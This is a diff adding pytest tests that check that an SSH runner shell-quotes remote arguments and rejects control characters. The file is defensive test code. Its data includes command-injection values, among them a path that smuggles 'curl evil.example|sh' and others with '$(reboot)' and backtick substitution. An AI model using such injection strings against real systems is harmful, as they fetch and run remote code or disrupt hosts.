@@ -1,6 +1,7 @@
 """Hard safety invariant tests — these tests are load-bearing.
 If any of these fail, the skill is broken and must not run."""
 import pytest
+import shlex
 from unittest.mock import patch
 import subprocess
 
@@ -60,3 +61,79 @@ def test_no_package_manager_install_anywhere_in_scripts():
             if re.search(pattern, text):
                 violations.append(f"{py_file}: matches {pattern}")
     assert not violations, "S2 violation: " + "; ".join(violations)
+
+
+def test_ssh_args_are_shell_quoted_end_to_end():
+    """S3: a find-derived path containing shell metacharacters must reach
+    the remote shell as ONE quoted operand, never as multiple commands."""
+    runner = SSHRunner(host="example.invalid", user="nobody")
+    hostile = "/var/www/up;curl evil.example|sh/package-lock.json"
+    ssh_cmd = runner._build_ssh_cmd(["sha256sum", hostile])
+    remote_string = ssh_cmd[-1]
+    # The remote shell will shlex-split this string. It must round-trip
+    # to exactly the argv we intended — injection chars stay inside quotes.
+    assert shlex.split(remote_string) == ["sha256sum", hostile]
+
+
+def test_ssh_quoting_preserves_find_grouping_operators():
+    """Bare ( and ) survive quoting as literal find operators."""
+    runner = SSHRunner(host="example.invalid", user="nobody")
+    argv = ["find", "/var/www", "(", "-name", "package-lock.json", ")", "-print"]
+    ssh_cmd = runner._build_ssh_cmd(argv)
+    assert shlex.split(ssh_cmd[-1]) == argv
+
+
+def test_ssh_quoting_covers_sudo_prefix():
+    runner = SSHRunner(host="example.invalid", user="nobody", use_sudo=True)
+    ssh_cmd = runner._build_ssh_cmd(["stat", "/var/www/a b"])
+    assert shlex.split(ssh_cmd[-1]) == ["sudo", "-n", "stat", "/var/www/a b"]
+
+
+def test_ssh_rejects_control_characters_in_any_argument():
+    """S3 defense in depth: NUL/CR/LF can never be legitimate in a remote
+    argv element and would corrupt line-oriented output parsing."""
+    runner = SSHRunner(host="example.invalid", user="nobody")
+    for bad in ["/var/www/a\nb", "/var/www/a\rb", "/var/www/a\x00b"]:
+        with pytest.raises(ValueError, match="control character"):
+            runner.run(["ls", bad])
+
+
+def test_ssh_identities_only_set_with_keyfile():
+    runner = SSHRunner(host="example.invalid", user="nobody", key_file="/k")
+    ssh_cmd = runner._build_ssh_cmd(["ls", "/tmp"])
+    assert "IdentitiesOnly=yes" in ssh_cmd
+
+
+def test_no_caller_side_quoting_for_ssh_args():
+    """S3 companion: SSHRunner quotes every remote argument centrally —
+    callers must never pre-quote or pre-escape. A pre-escaped "\\(" or a
+    caller-side shlex.quote() would arrive on the remote as literal
+    characters now that the runner quotes (issue #7 review follow-up)."""
+    allowed = {"ssh_runner.py", "publish.py"}  # publish builds its own scp/ssh cmdline
+    violations = []
+    for py_file in (SKILL_ROOT / "scripts").rglob("*.py"):
+        if py_file.name in allowed:
+            continue
+        text = py_file.read_text(encoding="utf-8")
+        if re.search(r'\\\\[()]', text):
+            violations.append(f"{py_file}: backslash-escaped find paren")
+        if "shlex.quote" in text:
+            violations.append(f"{py_file}: caller-side shlex.quote")
+    assert not violations, "callers must not pre-quote: " + "; ".join(violations)
+
+
+@pytest.mark.parametrize("hostile", [
+    "",
+    "/var/www/o'brien/package-lock.json",
+    "/var/www/$(reboot)/package-lock.json",
+    "/var/www/* glob */package-lock.json",
+    "/var/www/a b/package-lock.json",
+    '/var/www/"quoted"/package-lock.json',
+    "/var/www/`backtick`/package-lock.json",
+])
+def test_ssh_quoting_round_trips_edge_cases(hostile):
+    """S3: every metacharacter class must survive the quote/split round-trip
+    as one literal operand."""
+    runner = SSHRunner(host="example.invalid", user="nobody")
+    ssh_cmd = runner._build_ssh_cmd(["ls", hostile])
+    assert shlex.split(ssh_cmd[-1]) == ["ls", hostile]
